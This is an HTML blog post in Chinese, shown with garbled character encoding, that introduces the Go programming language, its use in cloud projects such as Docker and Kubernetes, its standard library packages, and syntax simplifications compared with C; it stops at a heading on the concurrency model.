<p>æœ€è¿‘åå¹´æ¥ï¼ŒC&#x2F;C++åœ¨è®¡ç®—é¢†åŸŸæ²¡æœ‰å¾ˆå¥½å¾—åˆ°å‘å±•ï¼Œå¹¶æ²¡æœ‰æ–°çš„ç³»ç»Ÿç¼–ç¨‹è¯­è¨€å‡ºç°ã€‚å¯¹å¼€å‘ç¨‹åº¦å’Œç³»ç»Ÿæ•ˆç‡åœ¨å¾ˆå¤šæƒ…å†µä¸‹ä¸èƒ½å…¼å¾—ã€‚è¦ä¹ˆæ‰§è¡Œæ•ˆç‡é«˜ï¼Œä½†ä½æ•ˆçš„å¼€å‘å’Œç¼–è¯‘ï¼Œå¦‚C++ï¼›è¦ä¹ˆæ‰§è¡Œä½æ•ˆï¼Œä½†æ‹¥æœ‰æœ‰æ•ˆçš„ç¼–è¯‘ï¼Œå¦‚.NETã€Javaï¼›æ‰€ä»¥éœ€è¦ä¸€ç§æ‹¥æœ‰è¾ƒé«˜æ•ˆçš„æ‰§è¡Œé€Ÿåº¦ã€ç¼–è¯‘é€Ÿåº¦å’Œå¼€å‘é€Ÿåº¦çš„ç¼–ç¨‹è¯­è¨€ï¼ŒGoå°±æ¨ªç©ºå‡ºä¸–äº†ã€‚</p>
<p>æ¯ä¸ªè¯­è¨€éƒ½æœ‰è‡ªå·±çš„ä¼˜ç‚¹ &#x3D; æ•´åˆ 12å¹´ Go</p>
<p><strong>goå‡ºç°ä¹‹å‰ï¼Œæ— è®ºæ±‡ç¼–è¯­è¨€ã€è¿˜æ˜¯åŠ¨æ€è„šæœ¬è¯­è¨€ï¼Œåœ¨æ‰§è¡Œæ•ˆç‡å’Œå¼€å‘æ•ˆç‡ä¸Šéƒ½ä¸èƒ½å…¼å¤‡ã€‚</strong></p>
<blockquote>
<p>Dockerã€Kubernetes</p>
</blockquote>
<p>ä¸€å®¶å«åš Docker çš„å…¬å¸ã€‚å°±æ˜¯ä½¿ç”¨ Go è¿›è¡Œé¡¹ç›®å¼€å‘ï¼Œå¹¶ä¿ƒè¿›äº†è®¡ç®—æœºé¢†åŸŸçš„å®¹å™¨è¡Œä¸šï¼Œè¿›è€Œå‡ºç°äº†åƒ Kubernetes è¿™æ ·çš„é¡¹ç›®ã€‚ç°åœ¨ï¼Œ<strong>æˆ‘ä»¬å®Œå…¨å¯ä»¥è¯´ Go æ˜¯å®¹å™¨è¯­è¨€</strong>ï¼Œè¿™æ˜¯å¦ä¸€ä¸ªå®Œå…¨å‡ºä¹æ„æ–™çš„ç»“æœã€‚</p>
<p>é™¤äº†å¤§åé¼é¼çš„Dockerï¼Œå®Œå…¨ç”¨GOå®ç°ã€‚ä¸šç•Œæœ€ä¸ºç«çˆ†çš„å®¹å™¨ç¼–æ’ç®¡ç†ç³»ç»Ÿkuberneteså®Œå…¨ç”¨GOå®ç°ã€‚ä¹‹åçš„Docker Swarmï¼Œå®Œå…¨ç”¨GOå®ç°ã€‚è¶Šæ¥è¶Šå¤šçš„äººå¼€å§‹åŠ å…¥å’Œå…³æ³¨ï¼&#x3D;&#x3D;&#x3D; Docker  1</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å„ç§æœ‰åçš„é¡¹ç›®ï¼Œå¦‚etcd&#x2F;consul&#x2F;flannelï¼Œ<strong>ä¸ƒç‰›äº‘å­˜å‚¨</strong>ç­‰ç­‰ å‡ä½¿ç”¨GOå®ç°ã€‚æœ‰äººè¯´ï¼ŒGOè¯­è¨€ä¹‹æ‰€ä»¥å‡ºåï¼Œæ˜¯èµ¶ä¸Šäº†äº‘æ—¶ä»£ã€‚ä½†ä¸ºä»€ä¹ˆä¸èƒ½æ¢ç§è¯´æ³•ï¼Ÿä¹Ÿæ˜¯GOè¯­è¨€ä¿ƒä½¿äº†äº‘çš„å‘å±•ã€‚</p>
<p>é™¤äº†äº‘é¡¹ç›®å¤–ï¼Œ2023è¿˜æœ‰åƒä»Šæ—¥å¤´æ¡ã€UBERè¿™æ ·çš„å…¬å¸ï¼Œä»–ä»¬ä¹Ÿä½¿ç”¨GOè¯­è¨€å¯¹è‡ªå·±çš„ä¸šåŠ¡è¿›è¡Œäº†å½»åº•çš„é‡æ„ã€‚</p>
<p>æ‰€ä»¥å½“ä¸‹goè¯­è¨€è¿˜æ˜¯å¾ˆæœ‰å‘å±•å‰æ™¯çš„ã€‚</p>
<blockquote>
<p>goè¯­è¨€çš„å±•æœ›</p>
</blockquote>
<p>Goè¯­è¨€æ˜¯è°·æ­Œ2009å¹´å‘å¸ƒçš„ç¬¬äºŒæ¬¾å¼€æºç¼–ç¨‹è¯­è¨€ï¼ˆç³»ç»Ÿå¼€å‘è¯­è¨€)ï¼Œå®ƒæ˜¯åŸºäºç¼–è¯‘ã€åƒåœ¾æ”¶é›†å’Œå¹¶å‘çš„ç¼–ç¨‹è¯­è¨€ã€‚</p>
<p>Goè¯­è¨€ä¸“é—¨é’ˆå¯¹å¤šå¤„ç†å™¨ç³»ç»Ÿåº”ç”¨ç¨‹åºçš„ç¼–ç¨‹è¿›è¡Œäº†ä¼˜åŒ–ï¼Œ<strong>ä½¿ç”¨Goç¼–è¯‘çš„ç¨‹åºå¯ä»¥åª²ç¾ C &#x2F; C++ä»£ç çš„é€Ÿåº¦ï¼Œè€Œä¸”æ›´åŠ å®‰å…¨ã€æ”¯æŒå¹¶è¡Œè¿›ç¨‹</strong>ã€‚</p>
<p>ä½œä¸ºå‡ºç°åœ¨21ä¸–çºªçš„è¯­è¨€ï¼Œå…¶è¿‘Cçš„æ‰§è¡Œæ€§èƒ½å’Œè¿‘è§£æå‹è¯­è¨€çš„å¼€å‘æ•ˆç‡ï¼Œä»¥åŠè¿‘ä¹äºå®Œç¾çš„ç¼–è¯‘é€Ÿåº¦ï¼Œå·²ç»é£é¡å…¨çƒã€‚</p>
<p><strong>ç‰¹åˆ«æ˜¯åœ¨äº‘é¡¹ç›®ä¸­ï¼Œå¤§éƒ¨åˆ†éƒ½ä½¿ç”¨äº†Golangæ¥å¼€å‘ã€‚PCã€ç§»åŠ¨ç«¯ã€äº‘æ—¶ä»£</strong>ä¸å¾—ä¸è¯´ï¼ŒGolangæ—©å·²æ·±å…¥äººå¿ƒã€‚è€Œå¯¹äºä¸€ä¸ªæ²¡æœ‰å†å²è´Ÿæ‹…çš„æ–°é¡¹ç›®ï¼ŒGolangæˆ–è®¸å°±æ˜¯ä¸ªä¸äºŒçš„é€‰æ‹©ã€‚ä¸ºä»€ä¹ˆå¾ˆå¤šæ–°é¡¹ç›®éƒ½æ˜¯ä½¿ç”¨Golangã€‚</p>
<p><strong>å¾ˆå¤šäººå°†Goè¯­è¨€ç§°ä¸º21ä¸–çºªçš„Cè¯­è¨€ï¼Œå› ä¸ºGoä¸ä»…æ‹¥æœ‰Cçš„ç®€æ´å’Œæ€§èƒ½ã€‚è€Œä¸”è¿˜å¾ˆå¥½çš„æä¾›äº†21ä¸–çºªäº’è”ç½‘ç¯å¢ƒä¸‹æœåŠ¡ç«¯å¼€å‘çš„å„ç§å®ç”¨ç‰¹æ€§ã€‚</strong></p>
<p>è¢«ç§°ä¸ºGoè¯­è¨€ä¹‹çˆ¶çš„ç½—å‹ƒÂ·æ´¾å…‹(Rob Pike)å°±æ›¾è¯´è¿‡ï¼Œä½ æ˜¯å¦åŒæ„Goè¯­è¨€ï¼Œå–å†³äºä½ æ˜¯è®¤å¯å°‘å°±æ˜¯å¤šï¼Œè¿˜æ˜¯å°‘å°±æ˜¯å°‘(Less is more or less is less)ã€‚<strong>Goè¯­è¨€çš„æ•´ä¸ªè®¾è®¡å“²å­¦å°±æ˜¯ï¼šå°†ç®€å•ã€å®ç”¨ä½“ç°å¾—æ·‹æ¼“å°½è‡´ã€‚ å­¦ä¹ èµ·æ¥å¾ˆè½»æ¾ï¼Œå¾ˆå®¹æ˜“å­¦ä¹ </strong></p>
<p><strong>å¦‚ä»Š Go å·²ç»æ˜¯äº‘è®¡ç®—ç¼–ç¨‹è¯­è¨€ï¼ŒGOè¯­è¨€èƒŒé Googleè¿™æ£µå¤§æ ‘ï¼Œåˆä¸ä¹ç‰›äººåé•‡ï¼Œæ˜¯åå‰¯å…¶å®çš„â€œç‰›äºŒä»£â€ã€‚</strong>æƒ³è±¡ä¸€ä¸‹ï¼šä¸€ä¸ªåªæœ‰åå‡ å¹´å‘å±•ç»å†çš„ç¼–ç¨‹è¯­è¨€ï¼Œå·²ç»æˆä¸ºäº†å¦‚æ­¤å·¨å¤§è€Œä¸”æ­£åœ¨ä¸æ–­å‘å±•çš„è¡Œä¸šçš„ä¸»å¯¼è€…ï¼Œè¿™ç§æˆåŠŸæ˜¯æ¯ä¸ªäººéƒ½æ— æ³•æƒ³è±¡çš„ã€‚</p>
<h2 id="Goè¯­è¨€å¸¸ç”¨åº“"><a href="#Goè¯­è¨€å¸¸ç”¨åº“" class="headerlink" title="Goè¯­è¨€å¸¸ç”¨åº“"></a>Goè¯­è¨€å¸¸ç”¨åº“</h2><p>å­¦ä¹ ç¼–ç¨‹è¯­è¨€ï¼Œæ—©å·²ä¸æ˜¯å­¦ä¸€ç‚¹è¯­æ³•è§„åˆ™é‚£ä¹ˆç®€å•ã€‚ç°åœ¨æ›´ä¹ æƒ¯ç§°ä½œé€‰æ‹© Ecosystemï¼ˆç”Ÿæ€åœˆï¼‰ï¼Œè€Œè¿™å…¶ä¸­æ ‡å‡†åº“çš„ä½œç”¨å’Œåˆ†é‡å°¤ä¸ºæ˜æ˜¾ã€‚</p>
<p>åœ¨Goè¯­è¨€çš„å®‰è£…æ–‡ä»¶é‡ŒåŒ…å«äº†ä¸€äº›å¯ä»¥ç›´æ¥ä½¿ç”¨çš„åŒ…ï¼Œå³æ ‡å‡†åº“ã€‚Goè¯­è¨€çš„æ ‡å‡†åº“ï¼ˆé€šå¸¸è¢«ç§°ä¸ºè¯­è¨€è‡ªå¸¦çš„ç”µæ± ï¼‰ï¼Œæä¾›äº†æ¸…æ™°çš„æ„å»ºæ¨¡å—å’Œå…¬å…±æ¥å£ï¼ŒåŒ…å« I&#x2F;O æ“ä½œã€æ–‡æœ¬å¤„ç†ã€å›¾åƒã€å¯†ç å­¦ã€ç½‘ç»œå’Œåˆ†å¸ƒå¼åº”ç”¨ç¨‹åºç­‰ï¼Œå¹¶æ”¯æŒè®¸å¤šæ ‡å‡†åŒ–çš„æ–‡ä»¶æ ¼å¼å’Œç¼–è§£ç åè®®ã€‚</p>
<p>åœ¨ Windows ä¸‹ï¼Œæ ‡å‡†åº“çš„ä½ç½®åœ¨Goè¯­è¨€æ ¹ç›®å½•ä¸‹çš„å­ç›®å½• pkg\windows_amd64 ä¸­ï¼›åœ¨ Linux ä¸‹ï¼Œæ ‡å‡†åº“åœ¨Goè¯­è¨€æ ¹ç›®å½•ä¸‹çš„å­ç›®å½• pkg\linux_amd64 ä¸­ï¼ˆå¦‚æœæ˜¯å®‰è£…çš„æ˜¯ 32 ä½ï¼Œåˆ™åœ¨ linux_386 ç›®å½•ä¸­ï¼‰ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ ‡å‡†åŒ…ä¼šå­˜æ”¾åœ¨ $GOROOT&#x2F;pkg&#x2F;$GOOS_$GOARCH&#x2F; ç›®å½•ä¸‹ã€‚</p>
<p>Goè¯­è¨€çš„ç¼–è¯‘å™¨ä¹Ÿæ˜¯æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œé€šè¿‡è¯æ³•å™¨æ‰«ææºç ï¼Œä½¿ç”¨è¯­æ³•æ ‘è·å¾—æºç é€»è¾‘åˆ†æ”¯ç­‰ã€‚Goè¯­è¨€çš„å‘¨è¾¹å·¥å…·ä¹Ÿæ˜¯å»ºç«‹åœ¨è¿™äº›æ ‡å‡†åº“ä¸Šã€‚åœ¨æ ‡å‡†åº“ä¸Šå¯ä»¥å®Œæˆå‡ ä¹å¤§éƒ¨åˆ†çš„éœ€æ±‚ã€‚</p>
<p>Goè¯­è¨€çš„æ ‡å‡†åº“ä»¥åŒ…çš„æ–¹å¼æä¾›æ”¯æŒï¼Œä¸‹è¡¨åˆ—å‡ºäº†Goè¯­è¨€æ ‡å‡†åº“ä¸­å¸¸è§çš„åŒ…åŠå…¶åŠŸèƒ½ã€‚</p>
<table>
<thead>
<tr>
<th>Goè¯­è¨€æ ‡å‡†åº“åŒ…å</th>
<th>åŠŸ  èƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>bufio</td>
<td>å¸¦ç¼“å†²çš„ I&#x2F;O æ“ä½œ</td>
</tr>
<tr>
<td>bytes</td>
<td>å®ç°å­—èŠ‚æ“ä½œ</td>
</tr>
<tr>
<td>container</td>
<td>å°è£…å †ã€åˆ—è¡¨å’Œç¯å½¢åˆ—è¡¨ç­‰å®¹å™¨</td>
</tr>
<tr>
<td>crypto</td>
<td>åŠ å¯†ç®—æ³•</td>
</tr>
<tr>
<td>database</td>
<td>æ•°æ®åº“é©±åŠ¨å’Œæ¥å£</td>
</tr>
<tr>
<td>debug</td>
<td>å„ç§è°ƒè¯•æ–‡ä»¶æ ¼å¼è®¿é—®åŠè°ƒè¯•åŠŸèƒ½</td>
</tr>
<tr>
<td>encoding</td>
<td>å¸¸è§ç®—æ³•å¦‚ JSONã€XMLã€Base64 ç­‰</td>
</tr>
<tr>
<td>flag</td>
<td>å‘½ä»¤è¡Œè§£æ</td>
</tr>
<tr>
<td>fmt</td>
<td>æ ¼å¼åŒ–æ“ä½œ</td>
</tr>
<tr>
<td>go</td>
<td>Goè¯­è¨€çš„è¯æ³•ã€è¯­æ³•æ ‘ã€ç±»å‹ç­‰ã€‚å¯é€šè¿‡è¿™ä¸ªåŒ…è¿›è¡Œä»£ç ä¿¡æ¯æå–å’Œä¿®æ”¹</td>
</tr>
<tr>
<td>html</td>
<td>HTML è½¬ä¹‰åŠæ¨¡æ¿ç³»ç»Ÿ</td>
</tr>
<tr>
<td>image</td>
<td>å¸¸è§å›¾å½¢æ ¼å¼çš„è®¿é—®åŠç”Ÿæˆ</td>
</tr>
<tr>
<td>io</td>
<td>å®ç° I&#x2F;O åŸå§‹è®¿é—®æ¥å£åŠè®¿é—®å°è£…</td>
</tr>
<tr>
<td>math</td>
<td>æ•°å­¦åº“</td>
</tr>
<tr>
<td>net</td>
<td>ç½‘ç»œåº“ï¼Œæ”¯æŒ Socketã€HTTPã€é‚®ä»¶ã€RPCã€SMTP ç­‰</td>
</tr>
<tr>
<td>os</td>
<td>æ“ä½œç³»ç»Ÿå¹³å°ä¸ä¾èµ–å¹³å°æ“ä½œå°è£…</td>
</tr>
<tr>
<td>path</td>
<td>å…¼å®¹å„æ“ä½œç³»ç»Ÿçš„è·¯å¾„æ“ä½œå®ç”¨å‡½æ•°</td>
</tr>
<tr>
<td>plugin</td>
<td>Go 1.7 åŠ å…¥çš„æ’ä»¶ç³»ç»Ÿã€‚æ”¯æŒå°†ä»£ç ç¼–è¯‘ä¸ºæ’ä»¶ï¼ŒæŒ‰éœ€åŠ è½½ï¼ˆä¸€ä¸ªå®Œæ•´çš„goç¯å¢ƒæ˜¯å¾ˆå¤§ä¹Ÿï¼Œåªæ”¾éœ€è¦çš„éƒ¨åˆ†ï¼‰</td>
</tr>
<tr>
<td>reflect</td>
<td>è¯­è¨€åå°„æ”¯æŒã€‚å¯ä»¥åŠ¨æ€è·å¾—ä»£ç ä¸­çš„ç±»å‹ä¿¡æ¯ï¼Œè·å–å’Œä¿®æ”¹å˜é‡çš„å€¼</td>
</tr>
<tr>
<td>regexp</td>
<td>æ­£åˆ™è¡¨è¾¾å¼å°è£…</td>
</tr>
<tr>
<td>runtime</td>
<td>è¿è¡Œæ—¶æ¥å£</td>
</tr>
<tr>
<td>sort</td>
<td>æ’åºæ¥å£</td>
</tr>
<tr>
<td>strings</td>
<td>å­—ç¬¦ä¸²è½¬æ¢ã€è§£æåŠå®ç”¨å‡½æ•°</td>
</tr>
<tr>
<td>time</td>
<td>æ—¶é—´æ¥å£</td>
</tr>
<tr>
<td>text</td>
<td>æ–‡æœ¬æ¨¡æ¿åŠ Token è¯æ³•å™¨</td>
</tr>
</tbody></table>
<p>å½“ç„¶ï¼Œä¼˜ç§€ç¬¬ä¸‰æ–¹èµ„æºä¹Ÿæ˜¯è¯­è¨€ç”Ÿæ€åœˆçš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚è¿‘å¹´æ¥å´›èµ·çš„å‡ é—¨è¯­è¨€ä¸­ï¼ŒGo ç®—æ˜¯ç‹¬æ ‘ä¸€å¸œï¼Œå¤§æ‰¹ä¼˜ç§€ä½œå“é¢‘ç¹æ¶Œç°ï¼Œè¿™ä¹Ÿç»™æˆ‘ä»¬å­¦ä¹  Go æä¾›äº†å¾ˆå¥½çš„å‚ç…§ã€‚</p>
<h2 id="Goè¯­è¨€ä»£ç æ¸…çˆ½"><a href="#Goè¯­è¨€ä»£ç æ¸…çˆ½" class="headerlink" title="Goè¯­è¨€ä»£ç æ¸…çˆ½"></a>Goè¯­è¨€ä»£ç æ¸…çˆ½</h2><p>Goè¯­è¨€è¯­æ³•ç±»ä¼¼äºCè¯­è¨€ï¼Œå› æ­¤ç†Ÿæ‚‰Cè¯­è¨€åŠå…¶æ´¾ç”Ÿè¯­è¨€ï¼ˆ[C++]ã€[C#]ã€Objective-C ç­‰ï¼‰çš„äººéƒ½ä¼šè¿…é€Ÿç†Ÿæ‚‰è¿™é—¨è¯­è¨€ã€‚</p>
<p>Cè¯­è¨€çš„æœ‰äº›è¯­æ³•ä¼šè®©ä»£ç å¯è¯»æ€§é™ä½ç”šè‡³å‘ç”Ÿæ­§ä¹‰ã€‚Goè¯­è¨€åœ¨Cè¯­è¨€çš„åŸºç¡€ä¸Šå–å…¶ç²¾åï¼Œå¼ƒå…¶ç³Ÿç²•ï¼Œå°†Cè¯­è¨€ä¸­è¾ƒä¸ºå®¹æ˜“å‘ç”Ÿé”™è¯¯çš„å†™æ³•è¿›è¡Œè°ƒæ•´ï¼Œåšå‡ºç›¸åº”çš„ç¼–è¯‘æç¤ºã€‚</p>
<blockquote>
<p>å»æ‰å¾ªç¯å†—ä½™æ‹¬å·</p>
</blockquote>
<p>Goè¯­è¨€åœ¨ä¼—å¤šå¤§å¸ˆçš„ä¸°å¯Œå®æˆ˜ç»éªŒçš„åŸºç¡€ä¸Šè¯ç”Ÿï¼Œå»é™¤äº†Cè¯­è¨€è¯­æ³•ä¸­ä¸€äº›å†—ä½™ã€çƒ¦ççš„éƒ¨åˆ†ã€‚ä¸‹é¢çš„ä»£ç æ˜¯Cè¯­è¨€çš„æ•°å€¼å¾ªç¯ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Cè¯­è¨€çš„foræ•°å€¼å¾ªç¯</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> a = <span class="number">0</span>;a&lt;<span class="number">10</span>;a++)&#123;</span><br><span class="line">	<span class="comment">// å¾ªç¯ä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨Goè¯­è¨€ä¸­ï¼Œè¿™æ ·çš„å¾ªç¯å˜ä¸ºï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a := <span class="number">0</span>;a&lt;<span class="number">10</span>;a++&#123;</span><br><span class="line">	<span class="comment">// å¾ªç¯ä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>for ä¸¤è¾¹çš„æ‹¬å·è¢«å»æ‰ï¼Œint å£°æ˜è¢«ç®€åŒ–ä¸º<code>:=</code>ï¼Œç›´æ¥é€šè¿‡ç¼–è¯‘å™¨å³å€¼æ¨å¯¼è·å¾— a çš„å˜é‡ç±»å‹å¹¶å£°æ˜ã€‚</p>
<blockquote>
<p>å»æ‰è¡¨è¾¾å¼å†—ä½™æ‹¬å·</p>
</blockquote>
<p>åŒæ ·çš„ç®€åŒ–ä¹Ÿå¯ä»¥åœ¨åˆ¤æ–­è¯­å¥ä¸­ä½“ç°å‡ºæ¥ï¼Œä»¥ä¸‹æ˜¯Cè¯­è¨€çš„åˆ¤æ–­è¯­å¥ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (è¡¨è¾¾å¼)&#123;</span><br><span class="line">	<span class="comment">// è¡¨è¾¾å¼æˆç«‹ </span></span><br></pre></td></tr></table></figure>

<p>åœ¨Goè¯­è¨€ä¸­ï¼Œæ— é¡»æ·»åŠ è¡¨è¾¾å¼æ‹¬å·ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> è¡¨è¾¾å¼&#123;</span><br><span class="line">	<span class="comment">// è¡¨è¾¾å¼æˆç«‹</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¾ˆå¤šä»£ç ä¸èƒ½ä¹±å†™ï¼ŒGoä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬æ•´ç†ä»£ç   </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¼ºåˆ¶çš„ä»£ç é£æ ¼</p>
</blockquote>
<p>Goè¯­è¨€ä¸­ï¼Œå·¦æ‹¬å·å¿…é¡»ç´§æ¥ç€è¯­å¥ä¸æ¢è¡Œã€‚å…¶ä»–æ ·å¼çš„æ‹¬å·å°†è¢«è§†ä¸ºä»£ç ç¼–è¯‘é”™è¯¯ã€‚<strong>è¿™ä¸ªç‰¹æ€§åˆšå¼€å§‹ä¼šä½¿å¼€å‘è€…æœ‰ä¸€äº›ä¸ä¹ æƒ¯</strong>ï¼Œä½†éšç€å¯¹Goè¯­è¨€çš„ä¸æ–­ç†Ÿæ‚‰ï¼Œå¼€å‘è€…å°±ä¼šå‘ç°é£æ ¼ç»Ÿä¸€è®©å¤§å®¶åœ¨é˜…è¯»ä»£ç æ—¶æŠŠæ³¨æ„åŠ›é›†ä¸­åˆ°äº†è§£å†³é—®é¢˜ä¸Šï¼Œè€Œä¸æ˜¯ä»£ç é£æ ¼ä¸Šã€‚</p>
<p>åŒæ—¶Goè¯­è¨€ä¹Ÿæä¾›äº†ä¸€å¥—æ ¼å¼åŒ–å·¥å…·ã€‚ä¸€äº›Goè¯­è¨€çš„å¼€å‘ç¯å¢ƒæˆ–è€…ç¼–è¾‘å™¨åœ¨ä¿å­˜æ—¶ï¼Œéƒ½ä¼šä½¿ç”¨æ ¼å¼åŒ–å·¥å…·å¯¹ä»£ç è¿›è¡Œæ ¼å¼åŒ–ï¼Œè®©ä»£ç æäº¤æ—¶å·²ç»æ˜¯ç»Ÿä¸€æ ¼å¼çš„ä»£ç ã€‚</p>
<blockquote>
<p>ä¸å†çº ç»“äº i++ å’Œ ++ i</p>
</blockquote>
<p>Cè¯­è¨€éå¸¸ç»å…¸çš„è€ƒè¯•é¢˜ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a, b;</span><br><span class="line">a = i++;</span><br><span class="line">b = ++i;</span><br></pre></td></tr></table></figure>

<p>è¿™ç§é¢˜ç›®å¯¹äºåˆå­¦è€…ç®€ç›´æ‘¸ä¸ç€å¤´è„‘ã€‚ä¸ºä»€ä¹ˆä¸€ä¸ªç®€å•çš„è‡ªå¢è¡¨è¾¾å¼éœ€è¦æœ‰ä¸¤ç§å†™æ³•ï¼Ÿ</p>
<p>å¤æ‚çš„ä¸œè¥¿éƒ½æ…¢æ…¢å»æ‰äº†ï¼Œè®©æ–°æ‰‹æ›´åŠ å®¹æ˜“ç†è§£</p>
<p>åœ¨Goè¯­è¨€ä¸­ï¼Œè‡ªå¢æ“ä½œç¬¦ä¸å†æ˜¯ä¸€ä¸ªæ“ä½œç¬¦ï¼Œè€Œæ˜¯ä¸€ä¸ªè¯­å¥ã€‚å› æ­¤ï¼Œåœ¨Goè¯­è¨€ä¸­è‡ªå¢åªæœ‰ä¸€ç§å†™æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i++</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå†™æˆå‰ç½®è‡ªå¢<code>++i</code>ï¼Œæˆ–è€…èµ‹å€¼åè‡ªå¢<code>a=i++</code>éƒ½å°†å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚</p>
<p>ä¸¤ä¸ªæ•°å­—äº¤æ¢</p>
<p>a &#x3D; 1</p>
<p>b &#x3D; 2</p>
<p>å®šå¼ ï¼ˆäº¤æ¢ä¸€å®šæ˜¯è¿™æ ·å­çš„ï¼Œè®©ç¼–è¯‘å™¨è‡ªåŠ¨æ‰§è¡Œï¼Œä¸ç”¨å»ç†ä¼šåº•å±‚å®ç°  21ä¸–çºªçš„è¯­è¨€ï¼‰</p>
<p>aï¼Œb &#x3D; bï¼Œa   ï¼ˆäººæ›´å¥½ç†è§£çš„ç¼–ç æ–¹å¼ï¼‰</p>
<p>ä¸è¦è§‰å¾—ç¼–ç¨‹å¾ˆéš¾ï¼ŒGo</p>
<h2 id="Goè¯­è¨€ç‰¹æ€§"><a href="#Goè¯­è¨€ç‰¹æ€§" class="headerlink" title="Goè¯­è¨€ç‰¹æ€§"></a>Goè¯­è¨€ç‰¹æ€§</h2><p>Goè¯­è¨€ä¹Ÿç§°ä¸º Golangï¼Œæ˜¯ç”± Google å…¬å¸å¼€å‘çš„ä¸€ç§é™æ€å¼ºç±»å‹ã€ç¼–è¯‘å‹ã€å¹¶å‘å‹ã€å¹¶å…·æœ‰åƒåœ¾å›æ”¶åŠŸèƒ½çš„ç¼–ç¨‹è¯­è¨€ã€‚</p>
<p>æ¥ä¸‹æ¥ä»å‡ ä¸ªæ–¹é¢æ¥å…·ä½“ä»‹ç»ä¸€ä¸‹Goè¯­è¨€çš„ç‰¹æ€§ã€‚</p>
<blockquote>
<p>è¯­æ³•ç®€å•</p>
</blockquote>
<p>æŠ›å¼€è¯­æ³•æ ·å¼ä¸è°ˆï¼Œå•å°±ç±»å‹å’Œè§„åˆ™è€Œè¨€ï¼ŒGo ä¸ C99ã€C11 ç›¸ä¼¼ä¹‹å¤„é¢‡å¤šï¼Œè¿™ä¹Ÿæ˜¯Goè¯­è¨€è¢«å† ä»¥â€œNextCâ€åå·çš„é‡è¦åŸå› ã€‚</p>
<p>Goè¯­è¨€çš„è¯­æ³•å¤„äºç®€å•å’Œå¤æ‚çš„ä¸¤æã€‚Cè¯­è¨€ç®€å•åˆ°ä½ æ¯å†™ä¸‹ä¸€è¡Œä»£ç ï¼Œéƒ½èƒ½åœ¨è„‘ä¸­æƒ³è±¡å‡ºç¼–è¯‘åçš„æ¨¡æ ·ï¼ŒæŒ‡ä»¤å¦‚ä½•æ‰§è¡Œï¼Œå†…å­˜å¦‚ä½•åˆ†é…ï¼Œç­‰ç­‰ã€‚è€Œ C çš„å¤æ‚åœ¨äºï¼Œå®ƒæœ‰å¤ªå¤šéšæ™¦è€Œä¸ç€è¾¹é™…çš„è§„åˆ™ï¼Œç€å®è®©äººå¤´ç–¼ã€‚ç›¸æ¯”è¾ƒè€Œè¨€ï¼ŒGo ä»é›¶å¼€å§‹ï¼Œæ²¡æœ‰å†å²åŒ…è¢±ï¼Œåœ¨æ±²å–ä¼—å¤šç»éªŒæ•™è®­åï¼Œå¯ä»å¤´è§„åˆ’ä¸€ä¸ªè§„åˆ™ä¸¥è°¨ã€æ¡ç†ç®€å•çš„ä¸–ç•Œã€‚</p>
<p>Goè¯­è¨€çš„è¯­æ³•è§„åˆ™ä¸¥è°¨ï¼Œæ²¡æœ‰æ­§ä¹‰ï¼Œæ›´æ²¡ä»€ä¹ˆé»‘é­”æ³•å˜å¼‚ç”¨æ³•ã€‚ä»»ä½•äººå†™å‡ºçš„ä»£ç éƒ½åŸºæœ¬ä¸€è‡´ï¼Œè¿™ä½¿å¾—Goè¯­è¨€ç®€å•æ˜“å­¦ã€‚æ”¾å¼ƒéƒ¨åˆ†â€œçµæ´»â€å’Œâ€œè‡ªç”±â€ï¼Œæ¢æ¥æ›´å¥½çš„ç»´æŠ¤æ€§ï¼Œæˆ‘è§‰å¾—æ˜¯å€¼å¾—çš„ã€‚</p>
<p>å°†â€œ++â€ã€â€œâ€“â€ä»è¿ç®—ç¬¦é™çº§ä¸ºè¯­å¥ï¼Œä¿ç•™æŒ‡é’ˆï¼Œä½†é»˜è®¤é˜»æ­¢æŒ‡é’ˆè¿ç®—ï¼Œå¸¦æ¥çš„å¥½å¤„æ˜¯æ˜¾è€Œæ˜“è§çš„ã€‚è¿˜æœ‰ï¼Œå°†åˆ‡ç‰‡å’Œå­—å…¸ä½œä¸ºå†…ç½®ç±»å‹ï¼Œä»è¿è¡Œæ—¶çš„å±‚é¢è¿›è¡Œä¼˜åŒ–ï¼Œè¿™ä¹Ÿç®—æ˜¯ä¸€ç§â€œç®€å•â€ã€‚</p>
<blockquote>
<p>å¹¶å‘æ¨¡å‹</p>
</blockquote>
